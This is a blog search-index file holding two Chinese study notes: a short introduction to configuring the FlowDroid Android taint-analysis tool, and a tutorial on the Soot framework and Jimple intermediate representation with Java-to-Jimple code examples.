<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>FlowDroid学习</title>
    <url>/2023/03/28/2023-03-28-FlowDroid%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>FlowDroid(github<a href="https://link.zhihu.com/?target=https://github.com/secure-software-engineering/FlowDroid">链接</a>)是目前对 Android app 进行污点分析效果最好的工具之一。 污点分析的目的其实很简单，就是为了检查应用中是否存在从污点源到泄漏点的数据流。 但是它的优点在于它构建的数据流精度很高，可以对上下文、流、对象和字段敏感，从而使得分析结果非常精确。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">InfoflowAndroidConfiguration config = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InfoflowAndroidConfiguration()</span>;<br><span class="hljs-comment">//设置sdk中的platform路径</span><br>config.get<span class="hljs-constructor">AnalysisFileConfig()</span>.set<span class="hljs-constructor">AndroidPlatformDir(<span class="hljs-params">androidPlatformsPath</span>)</span>;<br><span class="hljs-comment">//设置需要分析的apk的文件路径</span><br>config.get<span class="hljs-constructor">AnalysisFileConfig()</span>.set<span class="hljs-constructor">TargetAPKFile(<span class="hljs-params">apkFilePath</span>)</span><br><span class="hljs-comment">//sourceSinkFilePath是source点与sink点的声明文件</span><br>config.get<span class="hljs-constructor">AnalysisFileConfig()</span>.set<span class="hljs-constructor">SourceSinkFile(<span class="hljs-params">sourceSinkFilePath</span>)</span>;<br><span class="hljs-comment">//apk中的dex文件</span><br>config.set<span class="hljs-constructor">MergeDexFiles(<span class="hljs-params">true</span>)</span>;<br><span class="hljs-comment">//设置AccessPath的path长度限制，默认为5，设置-1表示不作限制</span><br>config.get<span class="hljs-constructor">AccessPathConfiguration()</span>.set<span class="hljs-constructor">AccessPathLength(-1)</span>;<br><span class="hljs-comment">//设置Abstractio的path长度限制，设置-1表示不作限制</span><br>config.get<span class="hljs-constructor">AccessPathConfiguration()</span>.set<span class="hljs-constructor">MaxAbstractionPathLength(-1)</span>;<br>SetupApplication setupApp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SetupApplication(<span class="hljs-params">conf</span>)</span>;<br><span class="hljs-comment">//设置Callback的声明文件</span><br>setupApp.set<span class="hljs-constructor">CallbackFile(<span class="hljs-string">&quot;res/AndroidCallbacks.txt&quot;</span>)</span>;<br>setupApp.run<span class="hljs-constructor">Infoflow()</span>;<br></code></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>soot-And-jimple</title>
    <url>/2023/03/24/2023-03-24-soot-And-jimple/</url>
    <content><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>soot API：<a href="https://soot-oss.github.io/soot/docs/4.4.1/jdoc/index.html">https://soot-oss.github.io/soot/docs/4.4.1/jdoc/index.html</a></p>
<p>官方文档：<a href="https://github.com/soot-oss/soot/wiki/Tutorials">https://github.com/soot-oss/soot/wiki/Tutorials</a></p>
<p>PDF：sootsurvivorsguide.pdf</p>
<p>一篇很不错的入门文章：<a href="https://zhuanlan.zhihu.com/p/558087790">https://zhuanlan.zhihu.com/p/558087790</a></p>
<h3 id="Soot"><a href="#Soot" class="headerlink" title="Soot"></a>Soot</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>Scene：表示进行分析一个类时产生的完整环境（上下文）。通过它，可以设置应用程序类（提供给 Soot 进行分析的类）、主类（包含主方法的类）和访问关于过程间分析的信息（例如，指针信息和调用图）。</p>
<p>SootClass：表示加载到 Soot 中或使用 Soot 创建的类。</p>
<p>SootMethod：表示类的方法。</p>
<p>SootFiled：表示类的成员字段。</p>
<p>Body：代表一个方法体，有不同的风格，对应于不同的 IR（例如 JimpleBody）。这些数据结构是使用面向对象技术实现的，并且尽可能地设计为易于使用和通用。</p>
<p>Unit： 表示 Soot 中的语句，jimple 使用 Stmt 表示。</p>
<p>Jimple 中间表示的处理方法集合在 soot.jimple、soot.jimple.internal 中，大量优化集合在 soot.jimple.toolkits.* 中，尤其是在 soot.jimple.toolkits.scalar 和 soot.jimple.toolkits.annotation.*</p>
<p>Values：一个数据被表示为一个 Value。包括：局部变量（Local）、常量（在 Jimple 中表示为 Constant）、表达式（在 Jimple 中表示为 Expr）等等。表达式有各种不同的实现，例如 BinopExpr 和 InvokeExpr ，但一般来说可以理解为对一个或多个值执行某些操作并返回另一个值。</p>
<p>Box：在 Soot 中的引用（类似于指针），一般用于修改代码，有以下两种类型。</p>
<ul>
<li>ValueBox：指 Values，每个 unit 中都有使用和定义的 Values 的概念，这对于替换 Units 中使用的或定义的 box 非常有用，例如在执行常量折叠时</li>
<li>UnitBox：指 Units，当一个 unit 可以有多个后继时（例如分支语句），就会使用 UnitBox。</li>
</ul>
<h4 id="Soot-执行阶段"><a href="#Soot-执行阶段" class="headerlink" title="Soot 执行阶段"></a>Soot 执行阶段</h4><p>Soot 中每一个执行的部分被称为 pack，而 Soot 的执行一般分为几个 packs 的阶段。第一步是生成 Jimple 代码以供各种 packs 使用。这是通过解析类、jimple 或 java 文件并将其结果通过 Jimple Body（jb） pack 进行传递。</p>
<p>packs 的命名方案相当简单。第一个字母指定 pack 接受的 IR；s 表示 Shimple，j 表示 Jimple，b 表示 Baf，g 表示 Grimp。第二个字母指定 pack 的角色；b 表示方法主体，t 表示用户定义的转换，o 表示优化，a 表示属性生成(注解)。pack 名称末尾的 p 表示 pack。例如，jap（Jimple 注解包）包含所有程序内分析。</p>
<p>下图是 Inter-procedural analysis（程序间分析） 的执行流程，在 Soot 运行周期中包括三个额外的包：cg（调用图生成），wjtp（整个 Jimple 转换包）和 wjap（整个 Jimple 注解包）。这些包生成的信息可以通过 Scene 提供给 Soot 的其他部分使用。而之后的 jtp、jop、jap 则是给每个 body 使用的，最终的产生的 bb（Baf Body 是 Soot 基于栈的中间表示，用于创建字节码）和 tag</p>
<p><img src="/2023/03/24/2023-03-24-soot-And-jimple/image-20230325211418466.png"><span class="image-caption">image-20230325211418466</span></p>
<p>我们可以扩展 Soot 的 Main 类以包括我们自己的分析，将一个中间步骤注入到 Soot 中，使得 Soot 可以运行我们自定义的分析并处理传递给它的所有其他选项。过程间（inter-procedural analysis）需要注入到 wjtp 阶段而过程内（intra-procedural analysis）则注入到 jtp 阶段。下图的代码示例展示了如何将一个类 MyAnalysisTagger（执行某些 intra-procedural analysis）的实例注入到 Soot 中。</p>
<p><img src="/2023/03/24/2023-03-24-soot-And-jimple/image-20230325221540502.png"><span class="image-caption">image-20230325221540502</span></p>
<h4 id="使用Soot创建一个类"><a href="#使用Soot创建一个类" class="headerlink" title="使用Soot创建一个类"></a>使用Soot创建一个类</h4><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//加载java.lang.Object类并创建相应的SootClass对象及SootMethods、字段SootFields</span><br><span class="hljs-comment">//如果有使用其他的类文件，需要引入例如标准库的类Scene.v().loadClassAndSupport(&quot;java.lang.System&quot;);</span><br>Scene.v().loadClassAndSupport(<span class="hljs-string">&quot;MyClass&quot;</span>);<br><br><span class="hljs-comment">//为HelloWorld类创建SootClass对象。</span><br>sClass = <span class="hljs-keyword">new</span> SootClass(<span class="hljs-string">&quot;HelloWorld&quot;</span>, Modifier.PUBLIC);<br><br><span class="hljs-comment">//设置父类为java.lang.Object的SootClass对象</span><br>sClass.setSuperclass(Scene.v().getSootClass(<span class="hljs-string">&quot;java.lang.Object&quot;</span>));<br><br><span class="hljs-comment">//把新建的SootClass添加到Scene</span><br>Scene.v().addClass(sClass);<br><br><span class="hljs-comment">//创建一个main方法</span><br>method = <span class="hljs-keyword">new</span> SootMethod(<span class="hljs-string">&quot;main&quot;</span>,                 <br>    Arrays.asList(<span class="hljs-keyword">new</span> Type[] &#123;ArrayType.v(RefType.v(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-number">1</span>)&#125;),<br>    VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);<br><br><span class="hljs-comment">//将method添加到SootClass中</span><br>sClass.addMethod(method);<br><br><span class="hljs-comment">//为main方法创建一个JimpleBody，并将其设为活跃</span><br>JimpleBody body = Jimple.v().newBody(method);<br>method.setActiveBody(body);<br><br><span class="hljs-comment">//创建locals，并将其放入JimpleBody</span><br>arg = Jimple.v().newLocal(<span class="hljs-string">&quot;l0&quot;</span>, ArrayType.v(RefType.v(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-number">1</span>));<br>body.getLocals().add(arg);<br><br><span class="hljs-comment">//将第一个参数的值分配给arg</span><br>units.add(Jimple.v().newIdentityStmt(arg, <br>      Jimple.v().newParameterRef(ArrayType.v<br>        (RefType.v(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-number">1</span>), <span class="hljs-number">0</span>)));<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// insert &quot;tmpRef.println(&quot;Hello world!&quot;)&quot;</span><br>&#123;<br>    SootMethod toCall = Scene.v().getMethod<br>      (<span class="hljs-string">&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;</span>);<br>    units.add(Jimple.v().newInvokeStmt<br>        (Jimple.v().newVirtualInvokeExpr<br>           (tmpRef, toCall.makeRef(), StringConstant.v(<span class="hljs-string">&quot;Hello world!&quot;</span>))));<br>&#125;<br><br><span class="hljs-comment">//输出为.class文件</span><br><span class="hljs-keyword">int</span> java_version = Options.v().java_version();<br>String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);<br>OutputStream streamOut = <span class="hljs-keyword">new</span> FileOutputStream(fileName);<br>BafASMBackend backend = <span class="hljs-keyword">new</span> BafASMBackend(sClass, java_version);<br>backend.generateClassFile(streamOut);<br>streamOut.close();<br>或者使用<br>String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);<br>OutputStream streamOut = <span class="hljs-keyword">new</span> JasminOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>PrintWriter writerOut = <span class="hljs-keyword">new</span> PrintWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(streamOut));<br>JasminClass jasminClass = <span class="hljs-keyword">new</span> soot.jimple.JasminClass(sClass);<br>jasminClass.print(writerOut);<br>writerOut.flush();<br>streamOut.close();<br><br><span class="hljs-comment">//输出为jimple文件</span><br>String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);<br>OutputStream streamOut = <span class="hljs-keyword">new</span> FileOutputStream(fileName);<br>PrintWriter writerOut = <span class="hljs-keyword">new</span> PrintWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(streamOut));<br>Printer.v().printTo(sClass, writerOut);<br>writerOut.flush();<br>streamOut.close();<br></code></pre></td></tr></table></figure>

<ul>
<li>SootClass 对应着一个对象。</li>
<li>SootMethod 只能有一个活动的 Body，可通过 SootMethod.getActiveBody() 获取。</li>
<li>Body有三个重要的功能：Locals、Traps 和 Units。<ul>
<li>Locals 是主体中的局部变量。</li>
<li>Traps 是哪些单元捕获的哪些异常。</li>
<li>Units 是语句本身。</li>
</ul>
</li>
</ul>
<h4 id="Soot配置与使用"><a href="#Soot配置与使用" class="headerlink" title="Soot配置与使用"></a>Soot配置与使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">G.reset();<span class="hljs-comment">//初始化soot</span><br>Options.v().set_src_prec(Options.src_prec_class);<span class="hljs-comment">//设置处理文件的类型,默认的是class文件</span><br>Options.v().set_process_dir(Collections.singletonList(processDir))<span class="hljs-comment">//处理路径</span><br>Options.v().set_whole_program(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//开启全局模式</span><br>Options.v().set_allow_phantom_refs(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//开启虚引用</span><br>Options.v().set_prepend_classpath(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//允许soot使用JVM的classpath</span><br>Options.v().set_output_format(Options.output_format_jimple);<span class="hljs-comment">//文件输出格式设置为jimple</span><br>Scene.v().loadNecessaryClasses();<span class="hljs-comment">//加载所有需要的类</span><br>PackManager.v().runPacks();<span class="hljs-comment">//运行soot中所有的分析包</span><br>PackManager.v().writeOutput();<span class="hljs-comment">//输出结果</span><br><br>G.reset();<br>Options.v().set_src_prec(Options.src_prec_class);<br>Options.v().set_process_dir(Collections.singletonList(processDir))<br>Options.v().set_whole_program(<span class="hljs-keyword">true</span>);<br>Options.v().set_allow_phantom_refs(<span class="hljs-keyword">true</span>);<br>Options.v().set_prepend_classpath(<span class="hljs-keyword">true</span>);<br>Options.v().set_output_format(Options.output_format_jimple);<br>Scene.v().loadNecessaryClasses();<br>PackManager.v().runPacks();<br>PackManager.v().writeOutput();<br></code></pre></td></tr></table></figure>

<p>apk配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">G.reset();<br>Options.v().set_prepend_classpath(<span class="hljs-keyword">true</span>);<br>Options.v().set_allow_phantom_refs(<span class="hljs-keyword">true</span>);<br>Options.v().set_src_prec(Options.src_prec_apk);<br>Options.v().set_process_dir(Collections.singletonList(apkPath));<br>Options.v().set_android_jars(androidJarPath);<br>Options.v().set_whole_program(<span class="hljs-keyword">true</span>);<br>List&lt;String&gt; excludeList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>excludeList.add(<span class="hljs-string">&quot;java.*&quot;</span>);<br>excludeList.add(<span class="hljs-string">&quot;javax.*&quot;</span>);<br>Options.v().set_exclude(excludeList);<span class="hljs-comment">//排除不需要分析的类和方法</span><br>Options.v().set_output_format(Options.output_format_jimple);<br>Scene.v().loadNecessaryClasses();<br><span class="hljs-comment">//PackManager.v().runPacks();</span><br></code></pre></td></tr></table></figure>

<p>设置全程序分析，默认情况下是不进行全程序分析的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>  PackManager.v().getPack(<span class="hljs-string">&quot;wjtp&quot;</span>).add(<br>      <span class="hljs-keyword">new</span> Transform(<span class="hljs-string">&quot;wjtp.myTransform&quot;</span>, <span class="hljs-keyword">new</span> SceneTransformer() &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">internalTransform</span><span class="hljs-params">(String phaseName,</span></span><br><span class="hljs-params"><span class="hljs-function">            Map options)</span> </span>&#123;<br>          System.err.println(Scene.v().getApplicationClasses());<br>        &#125;<br>      &#125;));<br>  soot.Main.main(args);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>一般使用 jtp、jop、jap 三个 pack 针对每个 body 进行分析。</p>
<ul>
<li>jtp 默认使用，并且是空的，需要我们放入自己的 intra-procedural analyses。</li>
<li>jop 中有 Jimple 优化功能，但在默认情况下是禁用的。</li>
<li>jap 默认启用，但是其中的处理功能会被禁用，当我们把自己的分析放入到 jap 时，会自动开启。</li>
<li>想要往 jtp、jop、jap 中加入 Transform 必须要使用 BodyTransformer。</li>
</ul>
<p>下面是一份 jap 的使用示例。注册了一个新的 BodyTransformer，为每个方法中的每个语句打印出标记</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>  PackManager.v().getPack(<span class="hljs-string">&quot;jap&quot;</span>).add(<br>      <span class="hljs-keyword">new</span> Transform(<span class="hljs-string">&quot;jap.myTransform&quot;</span>, <span class="hljs-keyword">new</span> BodyTransformer() &#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">internalTransform</span><span class="hljs-params">(Body body, String phase, Map options)</span> </span>&#123;<br>          <span class="hljs-keyword">for</span> (Unit u : body.getUnits()) &#123;<br>            System.out.println(u.getTags());<br>          &#125;<br>        &#125;<br>      &#125;));<br>  Options.v().set_verbose(<span class="hljs-keyword">true</span>);<br>  PhaseOptions.v().setPhaseOption(<span class="hljs-string">&quot;jap.npc&quot;</span>, <span class="hljs-string">&quot;on&quot;</span>);<br>  soot.Main.main(args);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h4><ol>
<li>确定分析的性质。是向前还是向后的流分析？是否需要特别考虑分支？</li>
<li>确定预期的近似值。是 may(并集) 分析还是 must(交集) 分析？即确定合并的信息流在通过一个节点时，采取并集还是交集。</li>
<li>执行实际的流分析。实质上为中间表示中的每种语句编写方程——例如，应如何处理赋值语句。</li>
<li>决定入口节点（如果是向后流）和内部节点的初始状态或近似值——通常是空集或全集，具体取决于分析的保守程度。 执行数据流分析需要一些表示数据如何在程序中流动的结构，例如控制流图（cfg）。 Soot 数据流框架通过 soot.toolkits.graph.DirectedGraph 接口进行处理 cfg。</li>
</ol>
<p>Soot 提供了三种数据流分析的实现：</p>
<ul>
<li>ForwardFlowAnalysis 前向分析，从 UnitGraph 的入口语句开始进行向前传播。</li>
<li>BackwardFlowAnalysis 后向分析，从 UnitGraph 的出口节点开始向后传播。</li>
<li>ForwardBranchedFlowAnalysis 前向分支分析，实质上是一种前向分析，但是允许将不同的流集传播到不同的分支中。例如：处理 if(p != null) ，则可以将  p != nll 传播到为 true 的分支中，p == null 传播到为 false 的分支中。</li>
</ul>
<h4 id="继承类"><a href="#继承类" class="headerlink" title="继承类"></a>继承类</h4><p>实现分析，需要继承 ForwardFlowAnalysis（BackwardFlowAnalysis、ForwardBranchedFlowAnalysis ），其有两个参数：</p>
<ul>
<li>N：节点类型。通常是 Unit，但也可以对保存其他类型节点的图进行流分析。</li>
<li>A: 抽象类型。通常使用 sets 或 maps 作为抽象类型，但一般来说，可以使用任何你喜欢的东西。但要注意，抽象类型必须正确地实现 equals(…) 和 hashCode()，这样 Soot 才能确定什么时候达到了固定点。</li>
</ul>
<h5 id="构造函数——真正的实现"><a href="#构造函数——真正的实现" class="headerlink" title="构造函数——真正的实现"></a>构造函数——真正的实现</h5><p>实现一个构造函数，需要以 DirectedGraph&lt;N&gt; 作为参数（其中N是节点类型），并将其传递给父类的构造函数。在构造函数的末尾需要调用 doAnalysis() 方法以执行数据流分析，在调用父类构造函数和 doAnalysis() 方法之间是实现数据流分析的过程。</p>
<p>一些需要实现的抽象方法：</p>
<ul>
<li>newInitialFlow() 返回一个自定义的抽象类型 A 的对象。这个对象被分配为每个语句的初始入集和出集，除了第一个语句的入集（如果实现的是一个向后分析，则为一个退出语句，例如 return 或 throw）</li>
<li>entryInitialFlow() 初始化第一个语句的入集。</li>
<li>copy(A source, A dest) 方法接受两个自定义的抽象类型 A 的参数：源和目标。实现将源复制到目标中。</li>
<li>merge(A in1, A in2, A out) 方法用于在控制流的合并点（例如 if/then/else 语句的末尾）合并流集。接受三个参数，一个来自左分支的出集，一个来自右分支的出集，这将成为合并点之后下一个语句的新合并入集。</li>
<li>flowThrough(A in, N d, A out) 方法接受三个参数，类型为 A 的入集； 要处理的类型为 N 的节点，通常是一个 Unit；类型为 A的出集。</li>
</ul>
<p>最后可以把分析的结果放在 tag 中。</p>
<h3 id="jimple"><a href="#jimple" class="headerlink" title="jimple"></a>jimple</h3><p>Jimple 是 soot 中最主要的中间表示，是一种三地址码（三地址码 Three-Address Code 也可简写为3AC，<strong>要求：指令右侧至多有一个操作符。</strong>）只需要大约15种不同的指令，例如：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">t2</span> = a + <span class="hljs-keyword">b </span>+ <span class="hljs-number">3</span><br>三地址码则表示为<br><span class="hljs-built_in">t1</span> = a + <span class="hljs-keyword">b</span><br><span class="hljs-keyword"></span><span class="hljs-built_in">t2</span> = <span class="hljs-built_in">t1</span> + <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

<p>使用 r0，r1，r2….表示类型对象；i0，i1，i2…..表示基本数据类型变量；带有 $ 表示临时变量，如上面的 t2 的含义；@parameter 表示函数参数。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">specialinvoke 	用于调用构造方法、父类方法、私有方法<br>virtualinvoke 	用于调用普通的成员方法<br>staticinvoke  	用于调用静态方法<br><span class="hljs-built_in">int</span>erfaceinvoke 相对于virtualinvoke不做优化，需要额外检查接口的实现<br></code></pre></td></tr></table></figure>

<p>其他部分与 smali 挺相像的，并且是很好理解的，直接看是十分容易明白的。直接看下面的例子：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Loop</span> &#123;</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span>[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            x = x+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>jimple：<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Loop</span> <span class="hljs-title">extends</span> <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> &lt;init&gt;()<br>    &#123;<br>        Loop r0;<br><br>        r0 := @<span class="hljs-keyword">this</span>: Loop;<br><br>        specialinvoke r0.&lt;java.lang.Object: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(java.lang.<span class="hljs-keyword">String</span>[])</span></span><br><span class="hljs-function">    </span>&#123;<br>        java.lang.<span class="hljs-keyword">String</span>[] r0;<br>        <span class="hljs-keyword">int</span> i1;<br><br>        r0 := @parameter0: java.lang.<span class="hljs-keyword">String</span>[];<br><br>        i1 = <span class="hljs-number">0</span>;<br><br>     label1:<br>        <span class="hljs-keyword">if</span> i1 &gt;= <span class="hljs-number">10</span> <span class="hljs-keyword">goto</span> label2;<br><br>        i1 = i1 + <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">goto</span> label1;<br><br>     label2:<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>在 jimple 代码中，开头是一个叫 Loop 的类继承了 java.lang.Object 类(默认的所有类的父类），然后是一个初始化的过程，生成默认的构造函数，默认会调用父类的构造函数(即 java.lang.Object )，接下来就是 main 函数，在源代码里 main 函数有一个 String[] args 的参数，这在 jimple 代码中就对应了一个声明的参数 r0，源代码中 for 循环里面的 i 在 jimple 代码中用 i1 指代，label1 里面的内容就是 for 循环的条件内容，只要不满足循环条件，用一个 goto 语句跳转到 label2。这里出现了一个有意思的现象，那就是源代码中 x 值的变化在 jimple 中被“优化”掉了，这是因为 x 是不活跃变量，所以会被优化。</p>
<h4 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoWhile</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        <span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            i = i+<span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">while</span> (arr[i]&lt;<span class="hljs-number">10</span>);<br>    &#125;<br>&#125;<br><br>jimple：<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoWhile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Object</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> &lt;init&gt;()<br>    &#123;<br>        DoWhile r0;<br><br>        r0 := @this: DoWhile;<br><br>        specialinvoke r0.&lt;java.lang.<span class="hljs-keyword">Object</span>: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(java.lang.<span class="hljs-keyword">String</span>[])<br>    &#123;<br>        <span class="hljs-keyword">int</span>[] r0;<br>        <span class="hljs-keyword">int</span> <span class="hljs-variable">$i0</span>, i1;<br>        java.lang.<span class="hljs-keyword">String</span>[] r1;<br><br>        r1 := @parameter0: java.lang.<span class="hljs-keyword">String</span>[];<br><br>        r0 = newarray (<span class="hljs-keyword">int</span>)[<span class="hljs-number">10</span>];<br><br>        i1 = <span class="hljs-number">0</span>;<br><br>     label1:<br>        i1 = i1 + <span class="hljs-number">1</span>;<br><br>        <span class="hljs-variable">$i0</span> = r0[i1];<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable">$i0</span> &lt; <span class="hljs-number">10</span> <span class="hljs-keyword">goto</span> label1;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里是给数据对象 arr 用 r0 来代替，并对它进行了初始化，接下来还是用 label 表示程序的位置，将每一次循环的条件都能表示出来。可以注意到：Do-While 循环是先进入循环执行对应的语句，再通过 if 语句进行循环的跳转。</p>
<h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodCall</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> b = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">int</span> c = foo(a,b);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> x + y;<br>    &#125;<br>&#125;<br><br>jimple：<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodCall</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Object</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> &lt;init&gt;()<br>    &#123;<br>        MethodCall r0;<br><br>        r0 := <span class="hljs-meta">@this</span>: MethodCall;<br><br>        specialinvoke r0.&lt;java.lang.Object: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(java.lang.String[])</span></span><br><span class="hljs-function">    </span>&#123;<br>        java.lang.String[] r0;<br><br>        r0 := <span class="hljs-meta">@parameter0</span>: java.lang.String[];<br><br>        staticinvoke &lt;MethodCall: <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>)</span>&gt;<span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">int</span> i0, i1, $i2;<br><br>        i0 := <span class="hljs-meta">@parameter0</span>: <span class="hljs-keyword">int</span>;<br><br>        i1 := <span class="hljs-meta">@parameter1</span>: <span class="hljs-keyword">int</span>;<br><br>        $i2 = i0 + i1;<br><br>        <span class="hljs-keyword">return</span> $i2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到我们定义的方法 foo 在源代码和 jimple 源码中差不多，很好理解，就是用了一个中间变量来取得 i0 和 i1 的和，再将这个中间变量 $i2 返回。在 main 函数中使用 staticinvoke 表示静态方法的调用。</p>
]]></content>
